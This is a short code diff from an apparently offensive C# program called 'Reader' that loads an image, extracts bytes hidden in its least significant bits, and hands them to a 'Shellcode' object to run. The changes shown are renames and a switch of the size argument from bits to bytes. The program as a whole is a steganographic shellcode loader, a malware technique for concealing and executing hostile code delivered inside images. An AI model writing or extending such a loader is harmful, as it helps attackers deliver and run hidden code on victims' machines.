@@ -13,7 +13,7 @@ namespace Reader
         static Bitmap bm;
 
 
-        static IImageSource img  = new FileSystem();
+        static IImageSource img  = new ImageFile();
         static IAlgorithm   alg  = new LSBM();
         static IPayload     pld  = new Shellcode();
 
@@ -21,12 +21,12 @@ namespace Reader
         {
             if (args.Length == 2)
             {
-                int payload_bits = int.Parse(args[0]);
-                payload_data = new byte[payload_bits / 8];
+                int payload_size = int.Parse(args[0]);
+                payload_data = new byte[payload_size];
 
-                bm = img.loadImage(args[1]);
-                alg.readImage(bm, payload_data);
-                pld.Run(payload_data);
+                bm = img.load(args[1]);
+                alg.read(bm, payload_data);
+                pld.run(payload_data);
             }
         }
     }
